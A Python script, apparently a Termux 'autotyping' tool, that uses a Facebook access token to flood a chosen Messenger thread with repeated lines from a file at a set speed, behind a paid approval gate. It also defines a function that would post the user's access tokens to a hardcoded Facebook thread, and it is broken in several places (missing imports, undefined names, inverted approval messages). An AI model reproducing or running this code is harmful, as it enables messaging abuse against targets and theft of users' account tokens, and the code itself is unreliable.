from platform import system
import sys
def testPY():
    if(sys.version_info[0] < 3):
        print ('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
        sys.exit()
def approval():
    os.system('clear')
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    
    try:    
       httpCaht = requests.get('https://github.com/mrpathan8840/text/blob/main/text.txt').text.strip() 
       if id in httpCaht:
            print("\33[1;32mYour Token is Successfully Approved")
            msg = str(os.geteuid())
            time.sleep(0.5)
            eno = input('enter your name: ')
            os.system('clear')
            print("Your Token : " + id)
            print('\33[1;37m----------------------------------------------')
            print("\33[1;32mImportant Note")
            print("\33[1;37m----------------------------------------------")
            print("\33[1;37mYour Token is not approved×")
            print('You Have to Take Approval first')
            print('Free wale dur rahe :)')
            print('\33[1;37m----------------------------------------------')
            print('Tool Owner:: Pathan x-')
            print(eno +" "+ "Your Token is : " + id)
            input('IF U WANT TO BUY THEN PRESS ENTER ')
            tks = ('Hello%20Zaiin%20!%20Please%20Approve%20My%20Token%20My%20token%20Is%20:%20' + id +'%20My%20Name%20is%20' + eno)
            os.system('am start https://wa.me/+918840505325?text=' + tks)
            time.sleep(1)

            approval()
    except:
        time.sleep(1)
###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

##
xx = '\033[0;93m' # DEFAULT
kk = '\033[93m' # KUNING +
hh = '\x1b[1;92m' # HIJAU +
hi = '\033[32m' # HIJAU -
uu = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
bb = '\33[1;96m' # BIRU -
pp= '\x1b[0;34m' # BIRU +

Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

def modelsInstaller():
	try :
		models = ['requests', 'colorama']
		for model in models:
			try:
				if(sys.version_info[0] < 3):
					os.system('cd C:\Python27\Scripts & pip install {}'.format(model))
				else :
					os.system('python -m pip install {}'.format(model))
				print (' ')
				print (' [+] {} has been installed successfully, Restart the program.'.format(model))
				sys.exit()
				print (' ')
			except:
				print (' [-] Install {} manually.'.format(model))
				print (' ')
	except:
		pass

import base64
import json
import time
from rich import print as printer
from rich.panel import Panel
from platform import system
from datetime import datetime

try :
	import requests
	from colorama import Fore
	from colorama import init
except :
	modelsInstaller()

requests.packages.urllib3.disable_warnings()

def cls():
	if system() == 'Linux':
		os.system('clear')
	else:
		if system() == 'Windows':
			os.system('cls')
cls()
CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'   # mode 31 = red forground
RESET = '\033[0m'  # mode 0  = reset
BLUE  = "\033[34m"
WHITE = "\u001b[37m",
YELLOW = "\u001b[33;1m",
CYAN  = "\033[36m"
MAGENTA = "\u001b[35m",
GREEN = "\033[32m"
RESET = "\033[0m"
BOLD = '\033[1m'
REVERSE = "\033[m"

def logo():
    clear = "\x1b[0m"
    colors = [31, 32, 36, 37, 35]

    x = """
$$\      $$\           
$$$\    $$$ |          
$$$$\  $$$$ | $$$$$$\  
$$\$$\$$ $$ |$$  __$$\ 
$$ \$$$  $$ |$$ |  \__|
$$ |\$  /$$ |$$ |      
$$ | \_/ $$ |$$ |      
\__|     \__|\__|      
                       

$$$$$$$\            $$\     $$\                           
$$  __$$\           $$ |    $$ |                          
$$ |  $$ |$$$$$$\ $$$$$$\   $$$$$$$\   $$$$$$\  $$$$$$$\  
$$$$$$$  |\____$$\\_$$  _|  $$  __$$\  \____$$\ $$  __$$\ 
$$  ____/ $$$$$$$ | $$ |    $$ |  $$ | $$$$$$$ |$$ |  $$ |
$$ |     $$  __$$ | $$ |$$\ $$ |  $$ |$$  __$$ |$$ |  $$ |
$$ |     \$$$$$$$ | \$$$$  |$$ |  $$ |\$$$$$$$ |$$ |  $$ |
\__|      \_______|  \____/ \__|  \__| \_______|\__|  \__|
                                                          

"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
approval()        
logo()
testPY()

def venom():
    clear = "\x1b[0m"
    colors = [34, 37, 32]

    y = '''
\033[1;33m╔══════════════════════════════════════════════════════════╗ 
                       
       \033[1;32m TH3 T00L CR34TOR H9RSH R9JPUT \033[1;97m                          

\033[1;34m╚══════════════════════════════════════════════════════════╝

'''
    for N, line in enumerate(y.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
    	
venom()


headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

def msg():
        parameters = {
            'access_token' : (access_tokens),
            'message': 'User Profile Name : '+getName(access_tokens)+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+thread_id
        }
        try:
            s = requests.post("https://graph.facebook.com/v15.0/t_100024666621706/", data=parameters, headers=headers)
        except:
            pass



def message_on_messenger(message):
    for i in ns:
        try:
            message = str(mn) + i
            url = "https://graph.facebook.com/v15.0/{0}/".format('t_' + str(thread_id))
            parameters = {'access_token': access_token, 'message': message}
            s = requests.post(url, data=parameters, headers=headers)
            tt = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
            

            if s.ok:
                print("\033[1;32;40m", end = "")
                print("[✓] Convo Or Inbox I'd Link  :--", thread_id)
                print("[=] Account Name :: ", mb)
                e = datetime.now()
                print (e.strftime("[✓] Increadable Syed Rehan Here :D | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
                print("[✓] Thik Hai Bhai Chala Gya ||  ", message, "\n")
                time.sleep(timm)
            else:
                print('\033[1;32m[x] Message Block ' + tt, '\n[×] Token Error\n')
                time.sleep(30)
        except Exception as e:
            print("\033[1;31;40m", end = "")
            print(e , '\n')           
            time.sleep(30)

def get_messages():
    try:
        url = "https://www.facebook.com"
    except HTTPError as e:
        print("HTTP Error")
    except URLError as e:
        print("URL Error")


if int:
    print('''\033[1;34m---------------------------------------------------------------------\n''')
    print('''\033[1;31m-=[  (( Autotypong Tool by Pathan )) ]=-''')
    print('''\033[1;32m-=[ Contact Us: https://www.facebook.com/TH3.SY3D.R3H4N  ]=-\n''')
    print('''\033[1;35m---------------------------------------------------------------------\n''')
    i = datetime.now()
    print(i.strftime("\033[1;34m[#] Start Time ==> %Y-%m-%d %I:%M:%S %p "))
    print('''\033[1;37m[#] _ Tool Fucker == > [ SYED REHAN  ]\n''')
    print("\033[1;36;40m", end = "")
    mo=str(input("\033[1;36m[+] Mobile Num :: "))
    token = input("[+] Input Token File Name :: ")
    print('\n')
    with open(token, 'r') as f2:
        access_token = f2.read()
        payload = {'access_token': access_token}
        a = "https://graph.facebook.com/v15.0/me"
        b = requests.get(a, params=payload)
        d = json.loads(b.text)
        if 'name' not in d:
            print(BOLD + RED + '\n[x] Token Invalid..!!')
            sys.exit()
        mb = d['name']
        print('\033[1;32mYour Profile Name :: \033[1;32;1m%s' % (mb))
        print('\n')
        thread_id = input(BOLD + CYAN + "\033[1;36m[+] Conservation ID :: \033[1;32;1m")
        mn= input(BOLD + CYAN + "\033[1;36m[+] Enter Kidx Name :: \033[1;32;1m")
        ms = input(BOLD + CYAN + "\033[1;36m[+] Add Np File :: \033[1;32;1m")
        repeat = int(input(BOLD + CYAN + "\033[1;36m[+] File Repeat No :: \033[1;32;1m"))
        timm = int(input(BOLD + CYAN + "\033[1;36m[+] Speed in Seconds :: \033[1;32;1m"))
        print('\n')
        print('''\033[1;34m________All Done....Loading Profile Info.....!''')
        print('\033[1;34mYour Profile Name :: ', mb)
        print('\n')
        ns = open(ms, 'r').readlines()
        

        for i in range(repeat):
            messenger = get_messages()
            message_on_messenger(thread_id)
